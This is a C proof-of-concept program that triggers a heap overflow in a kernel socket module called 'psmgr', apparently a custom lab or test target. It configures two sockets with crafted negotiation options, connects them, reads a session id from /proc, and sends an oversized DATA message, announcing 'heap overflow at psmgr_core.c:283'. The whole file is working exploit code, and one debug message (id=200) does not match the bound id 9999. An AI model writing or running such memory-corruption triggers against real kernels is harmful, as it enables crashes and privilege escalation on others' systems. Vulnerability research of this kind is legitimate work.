#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/socket.h>

#define AF_PSMGR 46
#define PSMGR_SOL 282
#define PSMGR_OPT_SET_ROLE 1
#define PSMGR_OPT_NEGO_1 2
#define PSMGR_OPT_NEGO_2 3
#define PSMGR_ROLE_INITIATOR 0x02
#define PSMGR_ROLE_RESPONDER 0x03
#define PSMGR_XFRM_WINDOW 0x02
#define PSMGR_MODE_INTERLEAVE 0x02
#define PSMGR_MSG_DATA 0x05
#define PSMGR_CLASS_EXTENDED 0x02

struct sockaddr_psmgr { uint16_t family; uint16_t pad; uint32_t id; };
struct psmgr_nego_1 { uint8_t enc_class; uint8_t xfrm_type; uint16_t reserved; };
struct psmgr_nego_2 { uint16_t reserved2; uint8_t enc_mode; uint8_t reserved; uint32_t proc_param; };

int main(void) {
    int fd_i, fd_r;
    struct sockaddr_psmgr addr;
    struct psmgr_nego_1 n1;
    struct psmgr_nego_2 n2;
    uint8_t role;
    uint8_t buf[24];
    ssize_t ret;
    FILE *f;
    char line[256];
    uint32_t responder_id = 0, initiator_id = 0;

    printf("step 1: create RESPONDER socket\n"); fflush(stdout);
    fd_r = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
    if (fd_r < 0) { printf("responder socket failed: %d %s\n", errno, strerror(errno)); return 1; }

    role = PSMGR_ROLE_RESPONDER;
    if (setsockopt(fd_r, PSMGR_SOL, PSMGR_OPT_SET_ROLE, &role, sizeof(role)) < 0) {
        printf("responder set_role failed: %d %s\n", errno, strerror(errno)); return 1;
    }
    /* NEGO_2: INTERLEAVE + proc_param=64 → out_offset=128 */
    memset(&n2, 0, sizeof(n2));
    n2.enc_mode = PSMGR_MODE_INTERLEAVE;
    n2.proc_param = 64;
    if (setsockopt(fd_r, PSMGR_SOL, PSMGR_OPT_NEGO_2, &n2, sizeof(n2)) < 0) {
        printf("nego2 failed: %d %s\n", errno, strerror(errno)); return 1;
    }
    /* Bind responder */
    memset(&addr, 0, sizeof(addr));
    addr.family = AF_PSMGR;
    addr.id = 9999;
    if (bind(fd_r, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        printf("responder bind failed: %d %s\n", errno, strerror(errno)); return 1;
    }
    printf("responder bound id=200\n"); fflush(stdout);

    printf("step 2: create INITIATOR socket\n"); fflush(stdout);
    fd_i = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
    if (fd_i < 0) { printf("initiator socket failed: %d %s\n", errno, strerror(errno)); return 1; }

    role = PSMGR_ROLE_INITIATOR;
    if (setsockopt(fd_i, PSMGR_SOL, PSMGR_OPT_SET_ROLE, &role, sizeof(role)) < 0) {
        printf("initiator set_role failed: %d %s\n", errno, strerror(errno)); return 1;
    }
    /* NEGO_1: EXTENDED enc_class + WINDOW xfrm */
    memset(&n1, 0, sizeof(n1));
    n1.enc_class = PSMGR_CLASS_EXTENDED;
    n1.xfrm_type = PSMGR_XFRM_WINDOW;
    if (setsockopt(fd_i, PSMGR_SOL, PSMGR_OPT_NEGO_1, &n1, sizeof(n1)) < 0) {
        printf("nego1 failed: %d %s\n", errno, strerror(errno)); return 1;
    }
    /* Connect to responder → triggers handshake, both ESTABLISHED */
    memset(&addr, 0, sizeof(addr));
    addr.family = AF_PSMGR;
    addr.id = 9999;
    if (connect(fd_i, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        printf("connect failed: %d %s\n", errno, strerror(errno)); return 1;
    }
    printf("connected! both ESTABLISHED, out_offset=64*2=128\n"); fflush(stdout);

    /* Get initiator session_id from proc */
    f = fopen("/proc/net/psmgr_table", "r");
    if (f) {
        while (fgets(line, sizeof(line), f)) {
            uint32_t sid; char role_str[32];
            if (sscanf(line, "%u %s", &sid, role_str) == 2) {
                printf("table: %s", line);
                if (strstr(role_str, "INITIATOR") && sid > 0)
                    initiator_id = sid;
            }
        }
        fclose(f);
    }
    printf("initiator_id=%u\n", initiator_id); fflush(stdout);

    printf("step 3: send DATA on initiator — out_offset=128, overflow!\n"); fflush(stdout);
    memset(buf, 0, sizeof(buf));
    buf[0] = PSMGR_MSG_DATA;
    buf[1] = initiator_id & 0xff;
    buf[2] = 16; buf[3] = 0;
    buf[4] = 0; buf[5] = 0; buf[6] = 0; buf[7] = 0;
    memset(buf + 8, 0x41, 16);

    ret = write(fd_i, buf, sizeof(buf));
    if (ret < 0) {
        printf("write failed: %d %s\n", errno, strerror(errno)); return 1;
    }
    printf("write ok ret=%zd — heap overflow at psmgr_core.c:283!\n", ret); fflush(stdout);
    close(fd_i);
    close(fd_r);
    return 0;
}

